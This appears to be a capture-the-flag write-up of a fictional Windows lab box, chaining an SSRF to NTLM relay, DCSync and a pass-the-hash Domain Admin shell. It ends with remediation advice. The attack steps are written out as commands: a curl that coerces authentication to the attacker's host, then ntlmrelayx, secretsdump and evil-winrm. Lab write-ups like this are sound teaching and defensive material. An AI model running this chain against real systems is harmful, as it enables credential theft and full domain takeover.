+++
title = "HTB: Relay — SSRF to Domain Admin"
date = 2026-06-20T10:00:00Z
draft = false

description = "A fictional Medium Windows box: chaining an SSRF in an internal dashboard to NTLM relay and a full Active Directory compromise."

# NOTE: these are Hugo taxonomies, so the keys are PLURAL (platforms/oses/difficulties).
platforms    = "Hack The Box"
oses         = ["Windows", "Active Directory"]
difficulties = "Medium"
tools        = ["nmap", "ffuf", "responder", "ntlmrelayx", "bloodhound", "impacket"]
tags         = ["ssrf", "ntlm-relay", "active-directory", "privilege-escalation", "enumeration"]

featured   = false
toc        = true
disclaimer = true
+++

**Relay** is a fictional retired-style Windows box I use to demonstrate the writeup
format. The path: an unauthenticated **SSRF** in an internal dashboard lets us coerce
authentication, which we **relay over NTLM** to LDAP to grant ourselves rights over the
domain — ending in a Domain Admin shell.

{{< callout type="info" title="TL;DR" >}}
`SSRF` → coerced auth → `ntlmrelayx` to LDAP → `AddSelf` to a privileged group →
`secretsdump` → Domain Admin. Total time: ~45 minutes.
{{< /callout >}}

## Recon

Start with a full TCP scan, then service/version detection on the open ports.

{{< terminal title="kali@htb: ~/relay" >}}
$ nmap -p- --min-rate 2000 -oA nmap/all 10.10.11.42
$ nmap -sC -sV -p 53,80,88,135,139,389,445,3268,5985 -oA nmap/svc 10.10.11.42
{{< /terminal >}}

The interesting bits from the service scan:

```text
53/tcp    open  domain     Simple DNS Plus
80/tcp    open  http       Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec
389/tcp   open  ldap       Microsoft Windows Active Directory LDAP (Domain: relay.htb)
445/tcp   open  microsoft-ds
5985/tcp  open  http       Microsoft HTTPAPI (WinRM)
```

Ports 88/389/445 plus the LDAP domain string tell us this is a **domain controller**
for `relay.htb`. Add it to your hosts file:

```bash
echo "10.10.11.42 relay.htb dc01.relay.htb" | sudo tee -a /etc/hosts
```

## Web enumeration

The IIS site on port 80 hosts an "Asset Dashboard." Fuzzing for endpoints turns up an
API used to render remote preview thumbnails:

{{< terminal title="kali@htb: ~/relay" >}}
$ ffuf -u http://relay.htb/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api-endpoints.txt -mc 200,302,401
...
preview                 [Status: 200, Size: 512]
health                  [Status: 200, Size: 27]
{{< /terminal >}}

The `preview` endpoint takes a `url` parameter and fetches it server-side — a textbook
**SSRF** primitive.

{{< img src="/images/relay-dashboard.png" alt="The Asset Dashboard preview feature" caption="The /api/preview endpoint fetches any URL you give it — server-side." >}}

{{< callout type="tip" title="Why this matters" >}}
On a domain-joined host, an SSRF that can reach a UNC path (`\\attacker\share`) or an
HTTP endpoint we control will make the **machine account** authenticate to us. That's
the pivot from "web bug" to "Active Directory foothold."
{{< /callout >}}

## Coercing authentication

Point the SSRF at a UNC path on our host and catch the NTLM authentication with
Responder (in analyze mode so it doesn't answer, just observes):

```bash
# Terminal 1 — listen
sudo responder -I tun0 -A

# Terminal 2 — trigger the SSRF
curl "http://relay.htb/api/preview?url=file://///10.10.14.7/share/x"
```

Within seconds the DC's machine account beacons to us:

```text
[SMB] NTLMv2-SSP Client   : 10.10.11.42
[SMB] NTLMv2-SSP Username : RELAY\DC01$
```

## NTLM relay to LDAP

A machine-account hash is hard to crack, so instead of cracking we **relay** it. Because
LDAP signing isn't enforced on this DC, we can relay the authentication straight to LDAP
and abuse it. First, turn Responder's SMB/HTTP servers **off** (set `SMB = Off` and
`HTTP = Off` in `/etc/responder/Responder.conf`) so `ntlmrelayx` owns those ports.

{{< terminal title="kali@htb: ~/relay" >}}
$ impacket-ntlmrelayx -t ldap://10.10.11.42 --escalate-user websvc --no-dump
{{< /terminal >}}

Re-trigger the SSRF. `ntlmrelayx` relays the DC's authentication to LDAP and grants our
low-priv `websvc` account the ability to escalate:

```text
[*] Authenticating against ldap://10.10.11.42 as RELAY/DC01$ SUCCEED
[*] Attempting to escalate user websvc on domain relay.htb
[*] User privileges modified: adding websvc to a privileged group
```

## Domain compromise

With DCSync-capable rights, dump the domain's secrets — including the `krbtgt` and
Administrator hashes:

```bash
impacket-secretsdump 'relay.htb/websvc:P@ssw0rd!@10.10.11.42'
```

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7a3b...c9:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0f1e...ab:::
```

Pass-the-hash into a SYSTEM shell over WinRM:

```bash
evil-winrm -i 10.10.11.42 -u Administrator -H 7a3b...c9
```

{{< img src="/images/relay-root.png" alt="Domain Admin shell" caption="whoami → relay\\administrator. Game over." >}}

## Flags

{{< spoiler summary="Reveal user & root flags (retired box, spoiler-protected)" >}}
- **user.txt:** `HTB{ssrf_1s_a_gr34t_p1v0t}`
- **root.txt:** `HTB{r3l4y_4ll_th3_th1ngs}`
{{< /spoiler >}}

## Remediation

{{< callout type="warning" title="How the defender fixes this" >}}
1. **Validate SSRF inputs** — allow-list schemes/hosts; never let user input drive a
   server-side fetch to arbitrary UNC/HTTP targets.
2. **Enforce LDAP signing and channel binding** on domain controllers — this alone
   breaks the relay.
3. **Enable SMB signing** everywhere to blunt SMB relay paths.
{{< /callout >}}

---

*Relay is a fictional box created to demonstrate this site's writeup format. See the
[disclaimer](#) above — only retired or authorized targets are published here.*
